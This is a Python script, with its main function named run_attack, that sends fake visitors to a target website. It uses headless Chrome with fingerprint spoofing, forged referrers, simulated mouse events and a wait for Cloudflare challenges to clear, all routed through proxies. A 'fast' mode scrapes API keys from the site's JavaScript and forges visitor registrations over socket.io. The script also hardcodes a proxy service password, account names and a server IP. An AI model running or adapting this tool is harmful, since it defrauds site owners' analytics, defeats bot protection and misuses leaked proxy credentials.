import sys, time, random, threading, json, os, re, urllib.request, urllib.parse
try:
    import undetected_chromedriver as uc
    HAS_UC = True
except ImportError:
    HAS_UC = False
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service

visit_count = 0
error_count = 0
lock = threading.Lock()
STATUS_FILE = "/root/visit_status.json"
CAPTCHA_CONFIG = {'service': '', 'api_key': ''}
DETECTED_MODE = 'normal'
SITE_INFO = {}

# === PROXY CONFIG ===
PROXY_RELAY_HOST = '127.0.0.1'
PROXY_RELAY_PORT = '18080'
USE_PROXIES = True

import socket
def detect_proxy_mode():
    my_ip = ''
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        my_ip = s.getsockname()[0]
        s.close()
    except: pass
    if my_ip == '46.101.52.177':
        return 'direct'
    return 'relay'

PROXY_MODE = detect_proxy_mode()

# === WEBSHARE DIRECT PROXY CONFIG ===
WEBSHARE_HOST = 'p.webshare.io'
WEBSHARE_PORT = 80
WEBSHARE_PASS = '3opjjm7k9oh2'
WEBSHARE_USERS = [f'rbttthqr-sa-{i}' for i in range(1, 11)]

# === AUTO-DETECT ===
def auto_detect_mode(target_url):
    print(f"[AUTO-DETECT] Analyzing {target_url}...", flush=True)
    si = {
        'has_cloudflare': False, 'has_cloudflare_api': False,
        'has_js_challenge': False, 'has_captcha': False,
        'has_socketio': False, 'has_websocket_tracking': False,
        'socket_api_url': None, 'socket_api_key': None,
        'needs_extended_wait': False, 'api_accessible': False,
    }
    try:
        hdrs = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        }
        req = urllib.request.Request(target_url, headers=hdrs)
        resp = urllib.request.urlopen(req, timeout=15)
        html = resp.read().decode('utf-8', errors='ignore')
        rh = dict(resp.headers)
        if 'cloudflare' in rh.get('server', '').lower():
            si['has_cloudflare'] = True
        if 'just a moment' in html.lower() or 'checking your browser' in html.lower():
            si['has_js_challenge'] = True
        if any(x in html.lower() for x in ['captcha', 'turnstile', 'recaptcha', 'hcaptcha']):
            si['has_captcha'] = True
        if 'socket.io' in html.lower():
            si['has_socketio'] = True
        js_urls = re.findall(r'src=["\x27]([^"\x27]*\.js[^"\x27]*)["\x27]', html)
        for js_url in js_urls[:5]:
            if js_url.startswith('/'):
                p = urllib.parse.urlparse(target_url)
                js_url = f"{p.scheme}://{p.netloc}{js_url}"
            elif not js_url.startswith('http'):
                continue
            try:
                jr = urllib.request.Request(js_url, headers=hdrs)
                jc = urllib.request.urlopen(jr, timeout=15).read().decode('utf-8', errors='ignore')
                if 'socket.io' in jc or 'Socket(' in jc:
                    si['has_socketio'] = True
                am = re.findall(r'[="\x27](https?://[a-zA-Z0-9._-]+(?:api|data|flow)[a-zA-Z0-9._/-]*)[="\x27]', jc)
                for au in am:
                    if au != target_url and 'whatsapp' not in au:
                        si['socket_api_url'] = au.rstrip('/')
                km = re.findall(r'(?:api[_-]?key|apiKey|nf-api-key)["\x27\s:=]+["\x27]([a-f0-9_]{20,})["\x27]', jc)
                if not km:
                    km = re.findall(r'[A-Z][a-z0-9]*="([a-f0-9_]{40,})"', jc)
                if km:
                    si['socket_api_key'] = km[0]
                if any(x in jc for x in ['visitor:active', 'visitor:pageEnter', '/visitors']):
                    si['has_websocket_tracking'] = True
            except:
                continue
        if si['socket_api_url']:
            try:
                tr = urllib.request.Request(si['socket_api_url'], headers={'User-Agent': hdrs['User-Agent']})
                urllib.request.urlopen(tr, timeout=10)
                si['api_accessible'] = True
            except urllib.error.HTTPError as e:
                si['has_cloudflare_api'] = e.code == 403
                if e.code in [404, 405]:
                    si['api_accessible'] = True
            except:
                pass
    except urllib.error.HTTPError as e:
        if e.code == 503:
            si['has_js_challenge'] = True
            si['has_cloudflare'] = True
    except:
        pass
    
    # Always use STEALTH (real browser) mode - most reliable
    mode = 'stealth'
    if si['has_websocket_tracking'] and si['socket_api_url'] and si['api_accessible'] and not si['has_cloudflare_api']:
        # Verify /visitors endpoint actually works before choosing FAST mode
        try:
            test_body = json.dumps({'deviceInfo': {'os': 'Windows', 'device': 'desktop', 'browser': 'Chrome'}, 'currentPage': 'main'}).encode()
            test_hdrs = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            test_req = urllib.request.Request(f"{si['socket_api_url']}/visitors", data=test_body, headers=test_hdrs)
            test_resp = urllib.request.urlopen(test_req, timeout=10)
            test_data = json.loads(test_resp.read().decode())
            if test_data.get('token'):
                mode = 'fast'
                print(f"[AUTO-DETECT] API /visitors verified OK - using FAST mode", flush=True)
            else:
                print(f"[AUTO-DETECT] API /visitors no token - using STEALTH", flush=True)
        except Exception as api_err:
            print(f"[AUTO-DETECT] API test failed ({api_err}) - using STEALTH", flush=True)
    
    print(f"[AUTO-DETECT] Mode: {mode.upper()} | CF:{si['has_cloudflare']} SIO:{si['has_socketio']} WS:{si['has_websocket_tracking']} API:{si['socket_api_url']}", flush=True)
    return mode, si

# === FINGERPRINT DATA ===
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
]
REFERRERS = [
    'https://www.google.com/', 'https://www.google.com/search?q=site',
    'https://www.google.com.sa/', 'https://www.google.ae/',
    'https://www.facebook.com/', 'https://l.facebook.com/',
    'https://t.co/', 'https://www.instagram.com/',
    '', '', '',
]
SCREENS = [(1920,1080),(1366,768),(1536,864),(1440,900),(1280,720),(390,844),(414,896)]

def get_stealth_js():
    ua = random.choice(USER_AGENTS)
    screen = random.choice(SCREENS)
    is_mobile = 'iPhone' in ua or 'Android' in ua
    platform = 'iPhone' if 'iPhone' in ua else ('Linux armv8l' if 'Android' in ua else random.choice(['Win32','MacIntel']))
    cores = random.choice([2,4] if is_mobile else [4,8,12,16])
    memory = random.choice([4,6] if is_mobile else [4,8,16,32])
    touch = random.randint(1,5) if is_mobile else 0
    ref = random.choice(REFERRERS)
    ref_js = f'Object.defineProperty(document,"referrer",{{get:()=>"{ref}"}});' if ref else ''
    return f"""
Object.defineProperty(navigator,'webdriver',{{get:()=>undefined}});
try{{delete navigator.__proto__.webdriver;}}catch(e){{}}
window.chrome={{runtime:{{}},loadTimes:function(){{return{{}}}},csi:function(){{return{{}}}}}};
Object.defineProperty(navigator,'platform',{{get:()=>'{platform}'}});
Object.defineProperty(navigator,'hardwareConcurrency',{{get:()=>{cores}}});
Object.defineProperty(navigator,'deviceMemory',{{get:()=>{memory}}});
Object.defineProperty(navigator,'maxTouchPoints',{{get:()=>{touch}}});
Object.defineProperty(screen,'width',{{get:()=>{screen[0]}}});
Object.defineProperty(screen,'height',{{get:()=>{screen[1]}}});
{ref_js}
"""

def get_human_interaction_js():
    scroll_y = random.randint(100, 600)
    mouse_points = random.randint(3, 8)
    return f"""
(function(){{
    var pts = {mouse_points};
    for(var i=0; i<pts; i++){{
        var x = Math.floor(Math.random()*window.innerWidth);
        var y = Math.floor(Math.random()*window.innerHeight);
        var ev = new MouseEvent('mousemove',{{clientX:x,clientY:y,bubbles:true}});
        document.dispatchEvent(ev);
    }}
    window.scrollBy(0, {scroll_y});
    setTimeout(function(){{window.scrollBy(0, -{scroll_y // 2});}}, 500);
    setTimeout(function(){{
        var elems = document.querySelectorAll('div,section,p,span,img');
        if(elems.length > 0){{
            var el = elems[Math.floor(Math.random()*elems.length)];
            var rect = el.getBoundingClientRect();
            if(rect.width > 0 && rect.height > 0){{
                var ce = new MouseEvent('click',{{clientX:rect.left+rect.width/2,clientY:rect.top+rect.height/2,bubbles:true}});
                el.dispatchEvent(ce);
            }}
        }}
    }}, 800);
    document.dispatchEvent(new Event('focus'));
    setTimeout(function(){{document.dispatchEvent(new Event('blur'));}}, 1000);
    setTimeout(function(){{document.dispatchEvent(new Event('focus'));}}, 2500);
}})();
"""

def write_status(max_visitors, start_time, status="running"):
    global visit_count, error_count
    elapsed = int(time.time() - start_time)
    progress = min(100, round((visit_count / max_visitors) * 100, 1)) if max_visitors > 0 else 0
    rate = round(visit_count / max(elapsed, 1) * 60, 1)
    data = {
        "status": status, "visits": visit_count, "target": max_visitors,
        "progress": progress, "elapsed": elapsed,
        "errors": error_count, "timestamp": int(time.time()),
        "mode": DETECTED_MODE, "rate": rate
    }
    try:
        with open(STATUS_FILE, "w") as f:
            json.dump(data, f)
    except: pass

def get_server_ram_mb():
    try:
        with open('/proc/meminfo') as f:
            for line in f:
                if 'MemTotal' in line:
                    return int(line.split()[1]) // 1024
    except: pass
    return 2048

def create_browser(ua=None, use_proxy=True):
    if not ua:
        ua = random.choice(USER_AGENTS)
    
    proxy_arg = f"--proxy-server=http://{PROXY_RELAY_HOST}:{PROXY_RELAY_PORT}" if (use_proxy and USE_PROXIES) else None
    
    if use_proxy and USE_PROXIES:
        print(f"  [PROXY] Relay -> {PROXY_RELAY_HOST}:{PROXY_RELAY_PORT} (Saudi IP)", flush=True)
    
    # Try undetected-chromedriver first (best CF bypass)
    if HAS_UC:
        try:
            options = uc.ChromeOptions()
            options.add_argument("--headless=new")
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--disable-gpu")
            options.add_argument("--window-size=1920,1080")
            options.add_argument("--js-flags=--max-old-space-size=96")
            options.add_argument("--mute-audio")
            options.add_argument(f"--user-agent={ua}")
            if proxy_arg:
                options.add_argument(proxy_arg)
            driver = uc.Chrome(options=options, headless=True)
            return driver
        except Exception as e:
            print(f"  [UC] Failed: {e}, falling back to selenium", flush=True)
    
    # Fallback: regular selenium with max stealth
    try:
        opts = Options()
        opts.add_argument("--headless=new")
        opts.add_argument("--no-sandbox")
        opts.add_argument("--disable-gpu")
        opts.add_argument("--disable-dev-shm-usage")
        opts.add_argument("--disable-blink-features=AutomationControlled")
        opts.add_argument("--window-size=1920,1080")
        opts.add_argument("--js-flags=--max-old-space-size=96")
        opts.add_argument("--disable-translate")
        opts.add_argument("--disable-sync")
        opts.add_argument("--disable-logging")
        opts.add_argument("--disable-default-apps")
        opts.add_argument("--disable-background-timer-throttling")
        opts.add_argument("--disable-backgrounding-occluded-windows")
        opts.add_argument("--disable-renderer-backgrounding")
        opts.add_argument("--disable-ipc-flooding-protection")
        opts.add_argument("--disable-application-cache")
        opts.add_argument("--aggressive-cache-discard")
        opts.add_argument("--disk-cache-size=0")
        opts.add_argument("--disable-hang-monitor")
        opts.add_argument("--disable-popup-blocking")
        opts.add_argument("--metrics-recording-only")
        opts.add_argument("--no-default-browser-check")
        opts.add_argument("--no-first-run")
        opts.add_argument("--mute-audio")
        opts.add_argument(f"--user-agent={ua}")
        opts.add_experimental_option('excludeSwitches', ['enable-automation'])
        opts.add_experimental_option('useAutomationExtension', False)
        if proxy_arg:
            opts.add_argument(proxy_arg)
        driver = webdriver.Chrome(options=opts)
        # Max stealth injection
        driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
            'source': get_stealth_js()
        })
        return driver
    except Exception as e:
        print(f"  [ERROR] Browser creation failed: {e}", flush=True)
        return None

# === TURBO ENGINE: Multi-browser, parallel tabs ===
def turbo_browser_worker(bid, tabs_per_batch, target_url, max_visits, start_time, proxies):
    global visit_count, error_count
    
    browser = create_browser(use_proxy=USE_PROXIES)
    if not browser:
        time.sleep(3)
        browser = create_browser(use_proxy=USE_PROXIES)
    if not browser:
        with lock:
            error_count += 1
        print(f"[B{bid}] Failed to create browser", flush=True)
        return
    
    batch_id = 0
    
    while True:
        with lock:
            if visit_count >= max_visits:
                break
            remaining = max_visits - visit_count
        
        if remaining <= 0:
            break
        
        batch = min(tabs_per_batch, remaining)
        batch_id += 1
        
        # Create FRESH browser for each batch (avoids cache/session issues)
        try: browser.quit()
        except: pass
        time.sleep(0.1)
        browser = create_browser(use_proxy=USE_PROXIES)
        if not browser:
            with lock: error_count += 1
            time.sleep(0.5)
            continue
        
        # Open tabs and visit
        handles = []
        try:
            # First tab
            browser.execute_script(get_stealth_js())
            browser.get(target_url)
            handles.append(browser.current_window_handle)
            
            # Open additional tabs
            for i in range(1, batch):
                try:
                    browser.execute_script("window.open('about:blank')")
                    browser.switch_to.window(browser.window_handles[-1])
                    browser.execute_script(get_stealth_js())
                    browser.get(target_url)
                    handles.append(browser.window_handles[-1])
                except:
                    with lock: error_count += 1
        except:
            with lock: error_count += 1
        
        # Wait for pages to load + handle Cloudflare challenge
        time.sleep(3)
        try:
            browser.switch_to.window(handles[0])
            pg = browser.page_source or ''
            cf_keywords = ['just a moment', 'checking your browser', 'cf-challenge', 'challenge-platform', 'cf_chl_opt', 'turnstile', 'ray id']
            cf_detected = any(x in pg.lower() for x in cf_keywords)
            if cf_detected:
                print(f'[B{bid}] CF challenge detected, waiting up to 30s...', flush=True)
                passed = False
                for w in range(30):
                    time.sleep(1)
                    try:
                        pg = browser.page_source or ''
                    except:
                        break
                    if not any(x in pg.lower() for x in ['just a moment', 'challenge-platform', 'cf_chl_opt', 'checking your browser']):
                        print(f'[B{bid}] CF challenge passed after {w+1}s!', flush=True)
                        passed = True
                        break
                if not passed:
                    print(f'[B{bid}] CF challenge NOT passed after 30s', flush=True)
                    # Try refreshing
                    try:
                        browser.refresh()
                        time.sleep(5)
                    except: pass
                # After CF passes, reload all other tabs
                for h in handles[1:]:
                    try:
                        browser.switch_to.window(h)
                        browser.get(target_url)
                    except: pass
                time.sleep(3)
        except: pass
        
        # Inject human interaction on all tabs
        for handle in handles:
            try:
                browser.switch_to.window(handle)
                browser.execute_script(get_human_interaction_js())
            except:
                pass
        
        # Wait for JS to execute and register visitor
        time.sleep(1.5)
        
        # Count successful visits
        batch_visits = 0
        for i, handle in enumerate(handles):
            try:
                browser.switch_to.window(handle)
                title = browser.title or ''
                html_len = len(browser.page_source) if browser.page_source else 0
                success = html_len > 500 and title != '' and 'about:blank' not in title and 'just a moment' not in title.lower()
                if success:
                    with lock:
                        if visit_count < max_visits:
                            visit_count += 1
                            batch_visits += 1
                else:
                    with lock: error_count += 1
            except:
                with lock: error_count += 1
        
        if batch_id % 3 == 0:
            write_status(max_visits, start_time, "running")
        
        print(f"[B{bid}] Batch {batch_id}: +{batch_visits} visits (total: {visit_count}/{max_visits})", flush=True)
    
    try: browser.quit()
    except: pass

# === FAST MODE: Direct HTTP + WebSocket ===
def fast_worker(wid, target_url, max_visits, start_time, proxies, site_info):
    global visit_count, error_count
    try:
        import socketio
    except ImportError:
        return
    api_url = site_info.get('socket_api_url', '')
    api_key = site_info.get('socket_api_key', '')
    while True:
        with lock:
            if visit_count >= max_visits: break
        try:
            ua = random.choice(USER_AGENTS)
            ref = random.choice(REFERRERS)
            parsed = urllib.parse.urlparse(target_url)
            di = {'os': random.choice(['Windows','macOS','iOS','Android']), 'device': random.choice(['desktop','mobile']), 'browser': random.choice(['Chrome','Firefox','Safari'])}
            body = json.dumps({'deviceInfo': di, 'currentPage': 'main'}).encode()
            rh = {'Content-Type': 'application/json', 'User-Agent': ua, 'Origin': f"{parsed.scheme}://{parsed.netloc}"}
            if ref: rh['Referer'] = ref
            if api_key: rh['nf-api-key'] = api_key
            req = urllib.request.Request(f"{api_url}/visitors", data=body, headers=rh)
            resp = urllib.request.urlopen(req, timeout=10)
            rd = json.loads(resp.read().decode())
            token = rd.get('token', '')
            if not token:
                with lock: error_count += 1
                continue
            sio = socketio.Client(reconnection=False)
            ce = threading.Event()
            @sio.event
            def connect(): ce.set()
            auth = {'token': token}
            if api_key: auth['nf-api-key'] = api_key
            sio.connect(api_url, transports=['websocket'], auth=auth, wait_timeout=5)
            ce.wait(timeout=3)
            if ce.is_set():
                sio.emit('visitor:pageEnter', 'main')
                sio.emit('visitor:active')
                with lock:
                    if visit_count < max_visits:
                        visit_count += 1
                sio.disconnect()
            else:
                with lock: error_count += 1
                try: sio.disconnect()
                except: pass
        except:
            with lock: error_count += 1
            time.sleep(0.02)

def run_attack(target_url, max_visitors=100, proxies=None):
    global visit_count, error_count, DETECTED_MODE, SITE_INFO
    visit_count = 0
    error_count = 0
    mode, site_info = auto_detect_mode(target_url)
    DETECTED_MODE = mode
    SITE_INFO = site_info
    start_time = time.time()
    ram = get_server_ram_mb()
    
    has_nexa = bool(site_info.get('socket_api_url'))
    max_browsers = 5
    tabs_per = 1
    
    if mode == 'fast':
        nt = min(100, max(20, max_visitors // 3))
        write_status(max_visitors, start_time, "starting")
        print(f"[FAST MODE] {max_visitors} visitors | {nt} threads | RAM:{ram}MB", flush=True)
        threads = []
        for i in range(nt):
            t = threading.Thread(target=fast_worker, args=(i, target_url, max_visitors, start_time, proxies or [], site_info))
            t.daemon = True
            t.start()
            threads.append(t)
    else:
        # TURBO MODE: multiple Selenium browsers with parallel tabs
        nb = max_browsers
        write_status(max_visitors, start_time, "starting")
        effective_parallel = nb * tabs_per
        proxy_info = f" | Proxy: {PROXY_RELAY_HOST}:{PROXY_RELAY_PORT} (Saudi IPs via relay)" if USE_PROXIES else " | No proxies"
        print(f"[TURBO MODE] {max_visitors} visitors | {nb} browsers x {tabs_per} tabs = {effective_parallel} parallel | RAM:{ram}MB{proxy_info}", flush=True)
        threads = []
        for i in range(nb):
            t = threading.Thread(target=turbo_browser_worker, args=(i, tabs_per, target_url, max_visitors, start_time, proxies or []))
            t.daemon = True
            t.start()
            threads.append(t)
            time.sleep(0.5)
    
    # Monitor progress
    while any(t.is_alive() for t in threads):
        write_status(max_visitors, start_time, "running")
        time.sleep(2)
    
    for t in threads:
        t.join(timeout=10)
    
    elapsed = int(time.time() - start_time)
    rate = round(visit_count / max(elapsed, 1) * 60, 1)
    write_status(max_visitors, start_time, "finished")
    print(f"Done! Mode:{mode.upper()} Visits:{visit_count} Errors:{error_count} Time:{elapsed}s Rate:{rate}/min", flush=True)

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "http://example.com"
    visitors = int(sys.argv[2]) if len(sys.argv) > 2 else 100
    proxy_file = sys.argv[3] if len(sys.argv) > 3 else None
    captcha_arg = sys.argv[4] if len(sys.argv) > 4 else ''
    if captcha_arg and captcha_arg.strip():
        CAPTCHA_CONFIG['api_key'] = captcha_arg.strip()
        CAPTCHA_CONFIG['service'] = 'auto'
    proxies = []
    if proxy_file:
        try:
            with open(proxy_file, 'r') as f:
                proxies = json.load(f)
            print(f"Loaded {len(proxies)} proxies", flush=True)
        except:
            print("Failed to load proxies", flush=True)
    run_attack(url, visitors, proxies if proxies else None)
